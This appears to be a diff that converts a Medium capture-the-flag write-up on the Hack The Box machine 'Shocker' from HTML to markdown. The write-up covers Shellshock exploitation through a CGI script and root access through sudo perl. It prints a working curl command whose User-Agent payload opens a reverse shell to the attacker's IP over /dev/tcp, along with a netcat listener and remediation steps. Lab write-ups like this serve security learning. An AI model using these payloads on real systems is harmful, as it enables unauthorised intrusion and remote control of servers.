@@ -1,28 +1,28 @@
-# 💥 Shocker: From 403 Forbidden to Root in Under 10 Mins! ⚡
+# Shocker
 
 The deadly cost of ignoring patches.🔥 See how a legendary bug crushed this server. Don't leave your door open! 👇
 
----
+***
 
 ### ⚡ Shocker: Shellshock Exploitation & Sudo Privilege Escalation
 
 ![](https://cdn-images-1.medium.com/max/800/1*ZEC_x5jy76wapcRZOhHfSQ.png)
 
-> <a href="https://medium.com/meetcyber/shocker-from-403-forbidden-to-root-in-under-10-mins-1b53c202699f?sk=ffffb4bbd623bfab236886639b2ec034" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/meetcyber/shocker-from-403-forbidden-to-root-in-under-10-mins-1b53c202699f?sk=ffffb4bbd623bfab236886639b2ec034" target="_blank">**Not a Member?? Click Here to read Full-Story**</a>
+> [**Not a Member?? Click Here to read Full-Story**](https://medium.com/meetcyber/shocker-from-403-forbidden-to-root-in-under-10-mins-1b53c202699f?sk=ffffb4bbd623bfab236886639b2ec034)
 
-**Target:** *Shocker (Hack The Box)* **OS:** *Linux* **Difficulty:** *Easy* **Attack Vectors:** *Shellshock (CGI) -\> Sudo Misconfiguration (Perl).*
+**Target:** _Shocker (Hack The Box)_ **OS:** _Linux_ **Difficulty:** _Easy_ **Attack Vectors:** _Shellshock (CGI) -> Sudo Misconfiguration (Perl)._
 
 ### Executive Summary
 
 This assessment targeted “Shocker,” a Linux server vulnerable to the infamous “Shellshock” bug (CVE-2014–6271). The initial foothold was achieved by identifying a hidden **`/cgi-bin/`** directory hosting a bash script (**`user.sh`**). By sending a crafted HTTP header to this script, I triggered remote code execution (RCE) and obtained a shell as the user **`shelly`**. Root compromise was achieved by enumerating sudo privileges. The user **`shelly`** was permitted to execute **`/usr/bin/perl`** as root without a password. I leveraged this misconfiguration to spawn a root shell instantly.
 
----
+***
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### 1.1 Reconnaissance & Enumeration
 
-#### 1.1.1 Nmap Scan
+#### 1.1.1 Nmap Scan
 
 We began the assessment with a comprehensive Nmap scan to identify open ports and services on **`10.10.10.56`**.
 
@@ -37,20 +37,20 @@ PORT     STATE SERVICE VERSION
 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 ```
 
-#### 1.1.2 Nmap Scan Analysis
+#### 1.1.2 Nmap Scan Analysis
 
 The scan revealed two entry points:
 
-- <span id="52c9">**Port 80 (HTTP):** Running Apache 2.4.18. The site has no title, which suggests a minimal or broken configuration.</span>
-- <span id="652c">**Port 2222 (SSH):** SSH is running on a non-standard port (2222 instead of 22). This is often done to evade simple scanners.</span>
+* **Port 80 (HTTP):** Running Apache 2.4.18. The site has no title, which suggests a minimal or broken configuration.
+* **Port 2222 (SSH):** SSH is running on a non-standard port (2222 instead of 22). This is often done to evade simple scanners.
 
 **Operating System:** The banner confirms the target is **Ubuntu Linux**.
 
-#### 1.1.3 Key Findings
+#### 1.1.3 Key Findings
 
-- <span id="903c">**Port 80:** Apache httpd 2.4.18.</span>
-- <span id="6d87">**Port 2222:** OpenSSH 7.2p2.</span>
-- <span id="85e3">**Context:** The box name “Shocker” and the presence of an Apache web server strongly suggest the **Shellshock** vulnerability (CVE-2014–6271), which affects CGI scripts.</span>
+* **Port 80:** Apache httpd 2.4.18.
+* **Port 2222:** OpenSSH 7.2p2.
+* **Context:** The box name “Shocker” and the presence of an Apache web server strongly suggest the **Shellshock** vulnerability (CVE-2014–6271), which affects CGI scripts.
 
 #### 1.2 Web Directory Enumeration
 
@@ -68,25 +68,25 @@ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.t
 
 ![](https://cdn-images-1.medium.com/max/800/1*683rc4_GxgoeD1G_wSZ2QA.png)
 
-- <span id="aa9e">**`/user.sh`** (Status: 200)</span>
+* **`/user.sh`** (Status: 200)
 
-1.  <span id="0df4">**2.3 Analysis:** The presence of a Bash script (**`user.sh`**) in the **`/cgi-bin/`** directory confirms the potential for a **Shellshock** (CVE-2014-6271) attack. This vulnerability allows an attacker to inject arbitrary commands via environment variables (like the **`User-Agent`** HTTP header), which the Bash shell inadvertently executes.</span>
+1. **2.3 Analysis:** The presence of a Bash script (**`user.sh`**) in the **`/cgi-bin/`** directory confirms the potential for a **Shellshock** (CVE-2014-6271) attack. This vulnerability allows an attacker to inject arbitrary commands via environment variables (like the **`User-Agent`** HTTP header), which the Bash shell inadvertently executes.
 
 ### 2.0 Exploitation
 
-#### 2.1 Establishing a Reverse Shell
+#### 2.1 Establishing a Reverse Shell
 
 **2.1.1** We confirmed the target script (**`user.sh`**) is vulnerable. The objective now is to leverage this flaw to obtain a reverse shell.
 
 **2.1.2 Methodology:**
 
-- <span id="2719">I will intercept the HTTP request to **`user.sh`** and modify the **`User-Agent`** header. By injecting the magic string **`() { :;};`** followed by a reverse shell command, I can force the server to connect back to my attack machine.</span>
+* I will intercept the HTTP request to **`user.sh`** and modify the **`User-Agent`** header. By injecting the magic string **`() { :;};`** followed by a reverse shell command, I can force the server to connect back to my attack machine.
 
-**Payload:** **`() { :;}; /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`**
+**Payload:** **`() { :;}; /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`**
 
-#### 2.1.3 Next Step: Execute the Exploit
+#### 2.1.3 Next Step: Execute the Exploit
 
-- <span id="ac10">Let’s get that shell.</span>
+* Let’s get that shell.
 
 **Step 1: Start your Listener** In your Linux terminal, start listening for the connection.
 
@@ -94,7 +94,7 @@ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.t
 nc -lvnp 4444
 ```
 
-**Step 2: Fire the Exploit** Run this command in a **new terminal tab**. *(I am using IP* ***`10.10.14.32`*** *your’s will not be the same, update it!)*
+**Step 2: Fire the Exploit** Run this command in a **new terminal tab**. _(I am using IP_ _**`10.10.14.32`**_ _your’s will not be the same, update it!)_
 
 ```
 curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.32/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh
@@ -110,14 +110,14 @@ curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.32/4444 0>&1" h
 
 **Commands:**
 
-- <span id="91b1">**`python3 -c 'import pty; pty.spawn("/bin/bash")'`**</span>
-- <span id="d1cb">**`Ctrl + Z`** (Background process)</span>
-- <span id="5447">**`stty raw -echo; fg`** (Foreground process with raw input)</span>
-- <span id="ad78">**`export TERM=xterm`**</span>
+* **`python3 -c 'import pty; pty.spawn("/bin/bash")'`**
+* **`Ctrl + Z`** (Background process)
+* **`stty raw -echo; fg`** (Foreground process with raw input)
+* **`export TERM=xterm`**
 
 ### 3.0 Post-Exploitation
 
-#### 3.1 Local Enumeration & User Flag
+#### 3.1 Local Enumeration & User Flag
 
 **3.1.1** With a stable shell, I navigated to the **`/home`** directory to identify valid users and retrieve the user flag.
 
@@ -130,7 +130,7 @@ shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
 
 ### 4.0 Privilege Escalation:
 
-#### 4.1 Lateral Movement
+#### 4.1 Lateral Movement
 
 **4.1.1 Enumeration** To identify potential escalation vectors, I checked the sudo privileges for the current user.
 
@@ -174,41 +174,41 @@ The compromise of “Shocker” highlights the danger of legacy systems and conf
 
 From there, privilege escalation was trivialized by a “convenience” configuration in sudoers. Allowing a user to run a language interpreter like Perl (or Python, Ruby, etc.) as root is functionally equivalent to giving them a root shell. The combination of an outdated patch level and loose internal permissions led to a total system compromise in under 15 minutes.
 
-### Red Team Mandate
+### Red Team Mandate
 
 As a Red Teamer, my job is to demonstrate the impact of these misconfigurations. The following remediation steps are critical:
 
 **Remediation Strategy**
 
-1.  <span id="7138">**Patch Management:** The server is running a version of Bash vulnerable to CVE-2014–6271. Update Bash immediately (**`apt-get update && apt-get upgrade bash`**).</span>
-2.  <span id="3824">**Sudo Restrictions:** The **`shelly`** user has excessive privileges. Remove the **`NOPASSWD`** entry for **`/usr/bin/perl`** in **`/etc/sudoers`**. If the user needs to run specific Perl scripts, allow *only* those specific script paths (e.g., **`/usr/bin/perl /opt/scripts/backup.pl`**), not the entire binary.</span>
-3.  <span id="ff06">**CGI Hygiene:** If CGI functionality is not strictly required, disable the **`cgi-module`** in Apache to prevent execution of scripts in **`/cgi-bin/`**.</span>
+1. **Patch Management:** The server is running a version of Bash vulnerable to CVE-2014–6271. Update Bash immediately (**`apt-get update && apt-get upgrade bash`**).
+2. **Sudo Restrictions:** The **`shelly`** user has excessive privileges. Remove the **`NOPASSWD`** entry for **`/usr/bin/perl`** in **`/etc/sudoers`**. If the user needs to run specific Perl scripts, allow _only_ those specific script paths (e.g., **`/usr/bin/perl /opt/scripts/backup.pl`**), not the entire binary.
+3. **CGI Hygiene:** If CGI functionality is not strictly required, disable the **`cgi-module`** in Apache to prevent execution of scripts in **`/cgi-bin/`**.
 
-### The Biblical Tie-In
+### The Biblical Tie-In
 
 The flaw in “Shocker” was an old wound left untreated. The system administrators likely knew about Shellshock but assumed, “It won’t happen to us,” or simply forgot to apply the patch. They ignored the warning signs.
 
-> ***“He who ignores discipline comes to poverty and shame, but whoever heeds correction is honored.” — Proverbs 13:18 (NIV)***
+> _**“He who ignores discipline comes to poverty and shame, but whoever heeds correction is honored.” — Proverbs 13:18 (NIV)**_
 
 **Application:** In cybersecurity, “correction” often comes in the form of patches and security advisories. Ignoring them leads to “poverty and shame” — the loss of data and reputation. The administrators of this box ignored the discipline of patch management.
 
 As professionals, we must be humble enough to heed correction. When a vulnerability is announced (like a spiritual conviction), we must act on it immediately, rather than letting it fester until it becomes a breach.
 
-### 🚀 Join the Mission
+### 🚀 Join the Mission
 
 I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.
 
-- <span id="9f0d">Is there a specific tool you wish existed?</span>
-- <span id="168b">Is there a hacking concept you want me to learn and explain?</span>
-- <span id="2834">Do you have a “brick wall” you’re hitting in your own research?</span>
+* Is there a specific tool you wish existed?
+* Is there a hacking concept you want me to learn and explain?
+* Do you have a “brick wall” you’re hitting in your own research?
 
 Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.
 
-<a href="https://discord.gg/y5P9NrzUBX" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/y5P9NrzUBX" title="https://discord.gg/y5P9NrzUBX"><strong>Join the Iron-Breach Discord Server!</strong><br />
-<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/y5P9NrzUBX" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="24dfae94077d6390f2d0a2dd40dfe1fc"></a>
+[**Join the Iron-Breach Discord Server!**\
+_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/y5P9NrzUBX)
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 1, 2026](https://medium.com/p/1b53c202699f).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 1, 2026](https://medium.com/p/1b53c202699f).
 
-<a href="https://medium.com/@nicholasmullenski/shocker-from-403-forbidden-to-root-in-under-10-mins-1b53c202699f" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/shocker-from-403-forbidden-to-root-in-under-10-mins-1b53c202699f)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
